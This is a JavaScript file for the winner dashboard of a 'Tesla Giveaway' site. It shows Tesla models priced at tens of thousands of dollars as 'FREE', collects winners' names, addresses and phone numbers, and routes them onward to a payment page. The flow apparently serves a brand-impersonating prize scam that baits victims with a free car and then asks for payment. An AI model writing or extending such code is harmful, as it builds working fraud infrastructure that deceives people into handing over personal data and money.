// ╔══════════════════════════════════════════════════════════╗
// ║     Tesla Giveaway — Winner Dashboard Logic              ║
// ╚══════════════════════════════════════════════════════════╝

// Car data — images served from Supabase Storage (no third-party hosting)
var SUPABASE_IMG = 'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/';

var cars = [
  { id:'cybertruck', name:'Cybertruck', price:'$71,985', emoji:'🛻',
    img: SUPABASE_IMG + 'cybertruck-main.png',
    specList:['325 mi Range','4.1s 0–60 mph','112 mph Top Speed','5 Seats','Dual Motor AWD'],
    badge:'Built Tough', detailPage:'vehicles/cybertruck.html' },
  { id:'modely', name:'Model Y', price:'$41,380', emoji:'🚙',
    img: SUPABASE_IMG + 'modely-main.png',
    specList:['321 mi Range','6.8s 0–60 mph','135 mph Top Speed','5–7 Seats','Rear-Wheel Drive'],
    badge:'Best Seller', detailPage:'vehicles/modely.html' },
  { id:'models', name:'Model S', price:'$111,380', emoji:'🏎️',
    img: SUPABASE_IMG + 'models-main.png',
    specList:['410 mi Range','3.1s 0–60 mph','200 mph Top Speed','5 Seats','Dual Motor AWD'],
    badge:'Luxury Performance', detailPage:'vehicles/models.html' },
  { id:'model3', name:'Model 3', price:'$38,380', emoji:'🚗',
    img: SUPABASE_IMG + 'model3-main.png',
    specList:['321 mi Range','5.8s 0–60 mph','140 mph Top Speed','5 Seats','Rear-Wheel Drive'],
    badge:'Most Popular', detailPage:'vehicles/model3.html' },
  { id:'modelx', name:'Model X', price:'$116,380', emoji:'🚐',
    img: SUPABASE_IMG + 'modelx-main.png',
    specList:['352 mi Range','3.8s 0–60 mph','149 mph Top Speed','7 Seats','Dual Motor AWD'],
    badge:'Iconic Design', detailPage:'vehicles/modelx.html' }
];

var selectedCar = null;

document.addEventListener('DOMContentLoaded', async function() {
  var urlSession = getParam('session');
  if (urlSession) {
    saveSession(urlSession);
    if (window.history && window.history.replaceState) {
      window.history.replaceState(null, '', 'dashboard.html');
    }
  }

  // FIRST: Check localStorage for an existing order BEFORE any API call.
  // Even if the session expired, a user with an order should never see the dashboard.
  var existingOrder = JSON.parse(localStorage.getItem('tesla_last_order') || 'null');
  if (existingOrder && existingOrder.orderId) {
    window.location.href = 'order-placed.html';
    return;
  }

  var session = getSession();
  if (!session) { 
    window.location.href = 'entry.html'; 
    return; 
  }

  try {
    var data = await apiCall('/session?token=' + encodeURIComponent(session));
    if (!data.valid) { 
      clearSession(); 
      window.location.href = 'entry.html'; 
      return; 
    }

    // Server-side order check: redirect immediately if user has an existing order
    if (data.hasOrder && data.order) {
      localStorage.setItem('tesla_last_order', JSON.stringify(data.order));
      if (data.order.selectedCar) localStorage.setItem('tesla_selected_car', JSON.stringify(data.order.selectedCar));
      if (data.order.deliveryDetails) localStorage.setItem('tesla_delivery_details', JSON.stringify(data.order.deliveryDetails));
      if (data.order.deliveryMethod) localStorage.setItem('tesla_delivery_method', JSON.stringify(data.order.deliveryMethod));
      window.location.href = 'order-placed.html';
      return;
    }

    if (urlSession) {
      var banner = document.getElementById('verifiedBanner');
      if (banner) {
        banner.style.display = 'flex';
        var nameDisplay = document.getElementById('userNameDisplay');
        if (nameDisplay) {
          nameDisplay.textContent = data.user.firstName || data.user.email.split('@')[0];
        }
      }
      launchConfetti(50);
    }

    window._userData = data.user;

    // === WELCOME POPUP NOTIFICATION ===
    function showWelcomePopup(welcomeName, isNewEntry) {
      var existing = document.querySelector('.welcome-popup');
      if (existing) existing.remove();
      
      var popup = document.createElement('div');
      popup.className = 'welcome-popup';
      popup.innerHTML = 
        '<span class="wp-icon">' + (isNewEntry ? '&#x1F389;' : '&#x1F44B;') + '</span>' +
        '<div class="wp-content">' +
          '<div class="wp-title">' + (isNewEntry ? 'Welcome, ' + escapeHtml(welcomeName) + '! &#x1F389;' : 'Welcome back, ' + escapeHtml(welcomeName) + '!') + '</div>' +
          '<div class="wp-sub">' + (isNewEntry ? 'Your entry has been submitted successfully. Choose your Tesla to get started.' : 'You are signed in. Continue where you left off or choose your Tesla.') + '</div>' +
        '</div>' +
        '<button class="wp-close" onclick="this.parentElement.remove()">&times;</button>';
      
      document.body.appendChild(popup);
      
      setTimeout(function() {
        if (popup.parentNode) {
          popup.classList.add('fadeout');
          setTimeout(function() { if (popup.parentNode) popup.remove(); }, 450);
        }
      }, 3500);
    }
    
    var isNewEntry = !!urlSession;
    var userName = data.user.firstName || data.user.email.split('@')[0];
    showWelcomePopup(userName, isNewEntry);
    // === END WELCOME POPUP ===

    // === PROGRESS RESUMPTION ===
    var savedDelivery = JSON.parse(localStorage.getItem('tesla_delivery_details') || 'null');
    var sessionEmail = data.user.email || '';
    if (savedDelivery && savedDelivery.email && sessionEmail) {
      if (savedDelivery.email.toLowerCase() !== sessionEmail.toLowerCase()) {
        try {
          localStorage.removeItem('tesla_selected_car');
          localStorage.removeItem('tesla_delivery_details');
          localStorage.removeItem('tesla_delivery_method');
          localStorage.removeItem('tesla_last_order');
          localStorage.removeItem('tesla_session_token');
          localStorage.removeItem('tesla_session');
          sessionStorage.removeItem('selectedTeslaVehicle');
        } catch(e) {}
        savedDelivery = null;
      }
    }
    
    var savedOrder = JSON.parse(localStorage.getItem('tesla_last_order') || 'null');
    var savedMethod = JSON.parse(localStorage.getItem('tesla_delivery_method') || 'null');
    var savedCar = JSON.parse(localStorage.getItem('tesla_selected_car') || 'null');

    if (savedOrder) {
      window.location.href = 'order-placed.html';
      return;
    } else if (savedCar && savedDelivery && savedMethod) {
      window.location.href = 'payment.html';
      return;
    } else if (savedCar && savedDelivery) {
      window.location.href = 'delivery-method.html';
      return;
    } else if (savedCar) {
      window.location.href = 'delivery-details.html';
      return;
    }
    // === END PROGRESS RESUMPTION ===

    var nameInput = document.querySelector('[name="fullName"]');
    if (nameInput && data.user.firstName) {
      nameInput.value = (data.user.firstName + ' ' + (data.user.lastName || '')).trim();
    }
    var phoneInput = document.querySelector('[name="deliveryPhone"]');
    if (phoneInput && data.user.phone) phoneInput.value = data.user.phone;

  } catch (err) {
    var savedProgress = localStorage.getItem('tesla_selected_car') || sessionStorage.getItem('tesla_selected_car');
    if (savedProgress) {
      showToast('Unable to verify session. Using saved progress.', 'warning');
      window._userData = {};
    } else { 
      clearSession(); 
      window.location.href = 'entry.html'; 
      return; 
    }
  }

  renderCars();
});


function navigateToDetail(carId) {
  for (var i = 0; i < cars.length; i++) {
    if (cars[i].id === carId) {
      window.location.href = cars[i].detailPage;
      return;
    }
  }
}

function renderCars() {
  var grid = document.getElementById('carGrid');
  if (!grid) return;
  
  // FIX: correct onclick escaping + add id attribute to each card for selectCar()
  grid.innerHTML = cars.map(function(car) {
    return '<div class="dash-car-card" id="card-' + car.id + '" onclick="navigateToDetail(\'' + car.id + '\')\" style="cursor:pointer;background:#fff;border:1px solid rgba(0,0,0,.06);border-radius:18px;overflow:hidden;transition:all .35s cubic-bezier(.4,0,.2,1);box-shadow:0 6px 24px rgba(0,0,0,.04);display:flex;flex-direction:column;height:100%;">' +
      '<div style="height:220px;background:radial-gradient(circle at center,rgba(227,25,55,.012) 0%,rgba(0,0,0,.02) 100%),#fcfcfc;display:flex;align-items:center;justify-content:center;padding:24px;position:relative;border-bottom:1px solid rgba(0,0,0,.04);">' +
        '<span style="position:absolute;top:16px;right:16px;background:rgba(227,25,55,.07);color:var(--red);border:1px solid rgba(227,25,55,.12);padding:4px 12px;border-radius:99px;font-size:10px;font-weight:700;letter-spacing:.04em;z-index:2;">' + car.badge + '</span>' +
        '<img src="' + car.img + '" alt="Tesla ' + car.name + '" style="height:92%;max-width:100%;object-fit:contain;transition:transform .5s cubic-bezier(.4,0,.2,1);filter:drop-shadow(0 6px 12px rgba(0,0,0,.1));" loading="lazy">' +
      '</div>' +
      '<div style="padding:24px 22px 26px;">' +
        '<h3 style="font-size:22px;font-weight:800;color:#111;letter-spacing:-.5px;margin:0 0 4px;">Tesla ' + car.name + '</h3>' +
        '<div style="display:flex;align-items:center;gap:10px;margin-bottom:16px;background:rgba(0,0,0,.015);padding:8px 14px;border-radius:8px;border:1px solid rgba(0,0,0,.03);width:fit-content;">' +
          '<span style="font-size:14px;text-decoration:line-through;color:rgba(0,0,0,.35);font-weight:500;">' + car.price + '</span>' +
          '<span style="font-size:12px;font-weight:800;background:var(--red);color:#fff;padding:3px 10px;border-radius:5px;letter-spacing:.05em;box-shadow:0 2px 8px rgba(227,25,55,.3);">FREE</span>' +
        '</div>' +
        '<div class="dash-specs" style="display:grid;grid-template-columns:1fr 1fr;gap:8px;">' +
          car.specList.map(function(s) {
            var parts = s.split(' ');
            var v = parts[0] + (parts[1] === 'mi' ? ' mi' : '');
            var l = parts.slice(parts[1] === 'mi' ? 2 : 1).join(' ');
            return '<div style="background:rgba(0,0,0,.01);border:1px solid rgba(0,0,0,.025);padding:8px 10px;border-radius:8px;display:flex;flex-direction:column;gap:2px;"><span style="font-size:14px;font-weight:700;color:#111;">' + v + '</span><span style="font-size:10px;color:rgba(0,0,0,.45);font-weight:500;">' + l + '</span></div>';
          }).join('') +
        '</div>' +
      '</div>' +
    '</div>';
  }).join('');
}

function selectCar(carId) {
  // Remove selected class from all cards
  var cards = document.querySelectorAll('.dash-car-card');
  for (var i = 0; i < cards.length; i++) cards[i].classList.remove('selected');
  
  // Highlight the selected card (id is now set correctly)
  var card = document.getElementById('card-' + carId);
  if (card) card.classList.add('selected');
  
  selectedCar = null;
  for (var j = 0; j < cars.length; j++) {
    if (cars[j].id === carId) { selectedCar = cars[j]; break; }
  }
  
  if (selectedCar) {
    setStep(3);
    document.getElementById('stepSelectCar').style.display = 'none';
    var deliveryStep = document.getElementById('stepDelivery');
    deliveryStep.style.display = 'block';
    deliveryStep.scrollIntoView({ behavior: 'smooth', block: 'start' });
    
    document.getElementById('selectedCarTitle').textContent = 'Tesla ' + selectedCar.name;
    document.getElementById('selectedCarColor').textContent = selectedCar.price + ' · FREE';
    document.getElementById('selectedCarEmoji').textContent = selectedCar.emoji;
  }
}

function goBackToCars() {
  setStep(2);
  document.getElementById('stepDelivery').style.display = 'none';
  document.getElementById('stepSelectCar').style.display = 'block';
  window.scrollTo({ top: 0, behavior: 'smooth' });
}

function setStep(n) {
  var stepIds = ['sc1','sc2','sc3','sc4'];
  var labelIds = ['sl1t','sl2t','sl3t','sl4t'];
  var lineIds = ['sl1','sl2','sl3'];
  
  for (var i = 0; i < stepIds.length; i++) {
    var stepNum = i + 1;
    var circle = document.getElementById(stepIds[i]);
    var label = document.getElementById(labelIds[i]);
    if (!circle) continue;
    if (stepNum < n) {
      circle.className = 's-circle done'; circle.textContent = '\u2713';
      if (label) label.className = 's-label done';
    } else if (stepNum === n) {
      circle.className = 's-circle active'; circle.textContent = String(stepNum);
      if (label) label.className = 's-label active';
    } else {
      circle.className = 's-circle'; circle.textContent = String(stepNum);
      if (label) label.className = 's-label';
    }
  }
  for (var j = 0; j < lineIds.length; j++) {
    var line = document.getElementById(lineIds[j]);
    if (!line) continue;
    if (j + 2 < n) line.className = 's-line done';
    else line.className = 's-line';
  }
}

document.addEventListener('submit', async function(e) {
  if (e.target.id !== 'deliveryForm') return;
  e.preventDefault();
  var form = e.target;
  var deliveryDetails = {
    fullName: (form.fullName && form.fullName.value || '').trim(),
    address: (form.address && form.address.value || '').trim(),
    city: (form.city && form.city.value || '').trim(),
    state: (form.state && form.state.value || '').trim(),
    zipCode: (form.zipCode && form.zipCode.value || '').trim(),
    country: (form.country && form.country.value || '').trim(),
    phone: (form.deliveryPhone && form.deliveryPhone.value || '').trim(),
    instructions: (form.instructions && form.instructions.value || '').trim(),
  };
  if (!deliveryDetails.fullName || !deliveryDetails.address || !deliveryDetails.city || !deliveryDetails.state || !deliveryDetails.zipCode || !deliveryDetails.country) {
    showToast('Please fill in all required fields.', 'error');
    return;
  }
  try {
    localStorage.setItem('tesla_selected_car', JSON.stringify(selectedCar));
    localStorage.setItem('tesla_delivery_details', JSON.stringify(deliveryDetails));
    localStorage.setItem('tesla_session_token', getSession());
    try {
      sessionStorage.setItem('tesla_selected_car', JSON.stringify(selectedCar));
      sessionStorage.setItem('tesla_delivery_details', JSON.stringify(deliveryDetails));
    } catch(e) {}
  } catch(e) {
    showToast('Unable to save your progress. Please try again.', 'error');
    return;
  }
  window.location.href = 'delivery-method.html';
});

function logout() {
  clearSession();
  try {
    localStorage.removeItem('tesla_selected_car');
    localStorage.removeItem('tesla_delivery_details');
    localStorage.removeItem('tesla_delivery_method');
    localStorage.removeItem('tesla_last_order');
  } catch(e) {}
  window.location.href = 'index.html';
}
